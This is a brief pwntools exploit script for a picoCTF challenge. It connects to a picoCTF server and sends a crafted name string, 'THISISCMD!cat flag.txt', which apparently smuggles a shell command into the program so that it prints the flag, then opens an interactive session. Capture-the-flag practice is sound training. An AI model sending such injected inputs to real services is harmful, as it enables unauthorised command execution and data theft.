#!/Users/vinnie/CTF/venv/bin/python3
from pwn import log, remote, ELF, p64, context

context.log_level = "debug"
elf = context.binary = ELF('./vuln', checksec=False)

# SETUP
conn = remote('amiable-citadel.picoctf.net', 54543)

# EXPLOIT HERE
conn.sendlineafter(b'What is your name?\n', b'THISISCMD!cat flag.txt')

conn.interactive()
conn.close()
